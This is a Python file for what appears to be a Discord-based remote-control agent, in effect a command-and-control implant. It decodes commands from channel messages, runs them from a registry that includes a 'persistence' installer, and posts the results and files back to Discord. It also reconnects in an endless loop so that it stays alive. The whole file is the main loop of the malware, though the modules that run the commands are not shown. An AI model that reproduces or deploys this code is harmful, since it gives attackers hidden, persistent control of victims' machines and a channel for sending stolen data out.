import discord
import os
import asyncio
from dotenv import load_dotenv
import decoder
import commands
import persistence

# Add persistence to the command registry
commands.EXEC_REGISTRY['cmd_persist'] = persistence.install_persistence

load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'✅ [ACTIVE] Logged in as {client.user}')

@client.event
async def on_message(message):
    if message.author == client.user: return

    intent = decoder.extract_intent(message.content)
    
    if intent:
        cmd_id, args = intent
        print(f"[*] Command: {cmd_id} | Args: {args}")
        
        if cmd_id in commands.EXEC_REGISTRY:
            try:
                # SPECIAL HANDLING FOR EXIT
                if cmd_id == 'cmd_exit':
                    await message.channel.send("🛑 Agent shutting down.")
                    await client.close()
                    commands.EXEC_REGISTRY[cmd_id](args)
                
                # NORMAL EXECUTION
                result = commands.EXEC_REGISTRY[cmd_id](args)
                
                if isinstance(result, discord.File):
                    await message.channel.send(file=result)
                else:
                    await message.channel.send(f"```{result}```")
                    
            except Exception as e:
                await message.channel.send(f"⚠️ Error: {str(e)}")

if __name__ == "__main__":
    if not TOKEN: print("❌ Error: .env missing.")
    else:
        while True:
            try:
                client.run(TOKEN)
            except Exception:
                import time
                time.sleep(5)